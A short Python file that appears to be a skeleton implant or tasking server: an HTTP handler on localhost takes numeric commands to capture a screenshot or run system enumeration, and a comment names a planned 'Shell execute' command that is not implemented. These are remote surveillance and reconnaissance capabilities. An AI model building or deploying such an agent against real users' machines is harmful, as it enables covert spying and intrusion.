from http.server import BaseHTTPRequestHandler

from tasks.enumeration import do_systeminfo
from tasks.screenshot import take_screenshot

PORT = 8000
HOST = "localhost"

# Commands:
# 0 = Screenshot
# 1 = Systeminfo
# 2 = Shell execute


class TaskingServer(BaseHTTPRequestHandler):
    def do_POST(self):
        content_len = int(self.headers.get("Content-Length"))
        if content_len == 0:
            self.send_response(500)
            self.end_headers()
            return

        post_body = self.rfile.read(content_len)

        if post_body[0] == 0:
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.end_headers()

            screenshot = take_screenshot()
            self.wfile.write(screenshot)

        elif post_body[0] == 1:
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.end_headers()

            systeminfo = do_systeminfo()
            self.wfile.write(systeminfo)
        else:
            self.send_response(500)
            self.end_headers()
            return

